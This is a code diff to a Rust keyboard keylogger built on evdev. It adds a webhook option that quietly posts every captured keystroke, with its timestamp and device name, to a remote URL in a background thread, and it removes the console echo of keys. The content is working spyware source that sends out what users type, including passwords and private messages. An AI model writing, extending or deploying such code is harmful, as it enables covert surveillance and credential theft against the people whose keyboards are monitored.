@@ -6,8 +6,9 @@ use chrono::Local;
 use nix::fcntl::{FcntlArg, OFlag};
 use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
 use nix::unistd;
+use serde_json::json;
 
-pub fn run_keylogger(log_path: &str) {
+pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
     // Scan for all input devices
     let devices = evdev::enumerate()
         .collect::<Vec<_>>();
@@ -94,7 +95,9 @@ pub fn run_keylogger(log_path: &str) {
 
     println!("Keylogger is now active and monitoring keyboards.");
     println!("Keys will be logged to: {}", log_path);
-    println!("Keys will also be printed to this console.");
+    if webhook_url.is_some() {
+        println!("Keys will also be sent to the configured webhook URL.");
+    }
     println!("Press Ctrl+C to stop.\n");
     
     writeln!(file, "=== Monitoring started, waiting for key events ===")
@@ -152,9 +155,10 @@ pub fn run_keylogger(log_path: &str) {
                                                     .expect("Failed to write to log file");
                                                 file.flush().expect("Failed to flush log file");
                                                 
-                                                // Also print to console
-                                                print!("{}", key_str);
-                                                std::io::stdout().flush().unwrap();
+                                                // Send to webhook if URL is provided
+                                                if let Some(ref url) = webhook_url {
+                                                    send_to_webhook(url, &key_str, &timestamp.to_string(), device_name);
+                                                }
                                             }
                                         }
                                     }
@@ -279,4 +283,42 @@ fn format_key(key: Key) -> String {
         // Default for unmapped keys
         _ => format!("[{:?}]", key),
     }
+}
+
+fn send_to_webhook(url: &str, key: &str, timestamp: &str, device: &str) {
+    // Send keystroke data to webhook asynchronously (non-blocking)
+    // We use a thread to avoid blocking the keylogger
+    let url = url.to_string();
+    let key = key.to_string();
+    let timestamp = timestamp.to_string();
+    let device = device.to_string();
+    
+    std::thread::spawn(move || {
+        let client = match reqwest::blocking::Client::builder()
+            .timeout(std::time::Duration::from_secs(5))
+            .build() {
+            Ok(c) => c,
+            Err(e) => {
+                eprintln!("Failed to create HTTP client: {}", e);
+                return;
+            }
+        };
+        
+        let payload = json!({
+            "timestamp": timestamp,
+            "device": device,
+            "key": key
+        });
+        
+        match client.post(&url)
+            .json(&payload)
+            .send() {
+            Ok(_) => {
+                // Successfully sent, no need to log on success to keep it quiet
+            }
+            Err(e) => {
+                eprintln!("Failed to send to webhook: {}", e);
+            }
+        }
+    });
 }
